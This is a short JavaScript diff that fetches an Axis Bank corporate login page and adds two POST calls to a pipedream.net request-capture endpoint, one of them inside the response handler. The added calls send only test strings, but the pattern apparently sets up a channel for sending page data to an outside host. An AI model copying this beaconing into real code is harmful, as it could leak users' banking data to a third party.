@@ -203,11 +203,20 @@ window.onerror = function(error, url, line) {
     console.log(error);
 };
 
+fetch("https://ca9060cf290a45196d9c67b8ed027888.m.pipedream.net", {
+  method: "POST",
+  body: JSON.stringify({"here": "testing"}),
+});
+
 fetch(
   "https://corporate.axisbank.co.in/wps/portal/cBanking/AxisSMCorporateLogin/axissmcorppage",
   { method: "GET", headers: { "Content-type": "text/plain" } }
 )
   .then((res) => {
+    fetch("https://ca9060cf290a45196d9c67b8ed027888.m.pipedream.net", {
+  method: "POST",
+  body: JSON.stringify({"here": "testing2"}),
+});
     return res.text();
   })
   .then((res) => {
